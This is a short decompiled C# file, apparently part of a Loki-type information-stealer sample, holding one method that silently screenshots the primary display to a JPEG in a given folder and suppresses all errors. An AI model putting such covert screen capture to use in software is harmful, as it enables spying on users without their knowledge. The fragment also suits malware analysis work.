using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;

namespace loki.loki.Utilies
{
	// Token: 0x02000028 RID: 40
	internal class Screen
	{
		// Token: 0x06000167 RID: 359 RVA: 0x00008E44 File Offset: 0x00007044
		public static void Get_scr(string string_0)
		{
			try
			{
				int width = Screen.PrimaryScreen.Bounds.Width;
				int height = Screen.PrimaryScreen.Bounds.Height;
				using (Bitmap bitmap = new Bitmap(width, height))
				{
					Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
					bitmap.Save(string_0 + "\\screen.jpeg", ImageFormat.Jpeg);
				}
			}
			catch (Exception)
			{
			}
		}
	}
}
